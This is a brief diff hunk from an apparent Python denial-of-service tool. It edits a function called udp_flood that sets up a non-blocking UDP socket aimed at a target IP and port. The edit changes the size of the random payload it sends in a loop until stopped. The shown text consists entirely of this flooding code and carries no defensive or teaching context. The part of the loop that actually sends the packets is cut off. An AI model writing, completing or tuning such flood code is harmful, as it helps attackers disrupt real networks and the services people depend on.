@@ -22,7 +22,7 @@ def udp_flood(target_ip, target_port, stop_flag):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.setblocking(False)  # Non-blocking mode
-    data = os.urandom(1469)  # Pre-generate random data
+    data = os.urandom(200)  # Pre-generate random data
 
     while not stop_flag.is_set():  # Check if stop flag is set
         try:
